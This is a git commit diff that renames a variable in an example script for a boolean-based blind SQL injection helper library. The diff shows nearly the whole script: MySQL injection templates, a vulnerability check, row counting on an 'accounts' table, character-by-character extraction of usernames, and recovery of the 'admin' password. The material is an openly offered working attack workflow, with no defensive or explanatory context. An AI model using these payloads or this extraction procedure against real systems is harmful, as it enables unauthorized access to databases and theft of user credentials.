54d9bed656c719697a906e5e8d6dbc8e64b8b91e
Vu0r1 <118264404+Vu0r1-sec@users.noreply.github.com>
2023-01-23 14:20:22 +0100

    Update booleanBased.py

--- examples/booleanBased.py
+++ examples/booleanBased.py
@@ -24,8 +24,8 @@ def exec_request(payload: str) -> bool:
 template = string.Template('OR ($request)$test # ')
 
 # Is target vulnerable ?
-binder = SqliHelper(MySqlConfig(), exec_request, template)
-if(binder.check("SELECT 1")):
+helper = SqliHelper(MySqlConfig(), exec_request, template)
+if(helper.check("SELECT 1")):
     print("Target is Vulnerable")
 else:
     print("Target is not Vulnerable")
@@ -33,21 +33,21 @@ else:
 
 # Extract number of account
 rq = "SELECT COUNT(*) FROM accounts"
-binder.prepare_new([*range(0, 1500)])
-result = binder.extract_val(rq)
+helper.prepare_new([*range(0, 1500)])
+result = helper.extract_val(rq)
 print("Numbers of accounts : ", result)
 
 # Extract top 10 usernames
 # basic template for extract string from mysql
 template = string.Template('OR ORD(MID(($request),$index,1))$test # ')
 candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)
-binder.prepare_new(candidates, template=template)
+helper.prepare_new(candidates, template=template)
 
-result = binder.extract_column(string.Template("SELECT username FROM accounts ORDER BY username LIMIT $index,1"), 0, 5)
+result = helper.extract_column(string.Template("SELECT username FROM accounts ORDER BY username LIMIT $index,1"), 0, 5)
 for cell in result:
     print("Username : ", "".join(map(chr, cell)))
 
 # extract pass
-binder.prepare_new()
-result = binder.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
+helper.prepare_new()
+result = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
 print("pass for 'admin' : ", "".join(map(chr, result)))
